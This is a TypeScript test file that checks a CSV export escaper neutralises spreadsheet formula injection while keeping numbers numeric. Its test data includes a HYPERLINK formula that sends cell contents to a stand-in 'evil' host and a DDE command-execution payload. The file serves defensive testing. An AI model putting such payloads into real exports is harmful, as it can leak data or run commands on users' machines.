/**
 * CSV export escaping (ADM-7): user-controlled text must not run as a
 * spreadsheet formula, while numbers stay numeric.
 */
import { describe, it, expect } from "vitest";
import { buildCsv, escapeCsvCell } from "../src/modules/admin/types";

describe("escapeCsvCell", () => {
  it.each([
    ['=HYPERLINK("http://evil?"&A1,"x")', `"'=HYPERLINK(""http://evil?""&A1,""x"")"`],
    ["+cmd|' /C calc'!A0", `"'+cmd|' /C calc'!A0"`],
    ["-2+3", `"'-2+3"`],
    ["@SUM(A1:A2)", `"'@SUM(A1:A2)"`],
    ["\tleading tab", `"'\tleading tab"`],
  ])("neutralises a formula-looking value %s", (input, expected) => {
    expect(escapeCsvCell(input)).toBe(expected);
  });

  it("keeps negative and decimal numbers numeric", () => {
    expect(escapeCsvCell(-1500)).toBe('"-1500"');
    expect(escapeCsvCell("-12.50")).toBe('"-12.50"');
  });

  it("quotes ordinary text, doubles quotes and flattens new lines", () => {
    expect(escapeCsvCell('Kandy "Hill"\nRoad')).toBe('"Kandy ""Hill"" Road"');
  });

  it("renders null and undefined as empty cells", () => {
    expect(escapeCsvCell(null)).toBe("");
    expect(escapeCsvCell(undefined)).toBe("");
  });

  it("builds a header line and escaped rows", () => {
    expect(buildCsv(["name", "amount"], [["=1+1", 200]])).toBe(
      `"name","amount"\n"'=1+1","200"`,
    );
  });
});
